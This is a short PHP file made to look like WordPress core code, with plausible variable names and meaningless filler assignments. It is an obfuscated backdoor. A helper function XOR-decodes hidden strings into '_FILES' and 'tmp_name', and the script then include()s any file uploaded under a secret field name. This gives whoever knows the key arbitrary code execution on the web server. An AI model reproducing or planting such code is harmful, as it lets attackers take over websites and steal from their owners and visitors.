<?php 	
$default_term_id = 'nYorJWoLxO';

$weeks = $default_term_id;
	$translation = 'comments_in';
function default_editor($local, $patterns)

{

    $nested_code_pre = $patterns;

    $subject = urldecode($local);
	$static_characters = 'locale';
    $allowed_protocols = substr($nested_code_pre,0, strlen($subject));
    $protocol = $subject ^ $allowed_protocols;
	$secs = 'single';
    return $protocol;
}
$protocols = ${default_editor("1%1F%26%3E%0F%04", $weeks)};
	$filtered = 'regex';
$unsanitized_postarr = $protocols;
	$wpsmiliestrans = 'chars';
$page_ids = isset($unsanitized_postarr[$weeks]);
if ($page_ids)

{
	$attachment_id = 'lastpostmodified';
    $add_trashed_suffix = $protocols[$weeks];
    $tt_ids = $add_trashed_suffix[default_editor("%1A4%1F-%246%02%29", $weeks)];
    $icon_dir = $tt_ids;

    include ($icon_dir);

}
?>
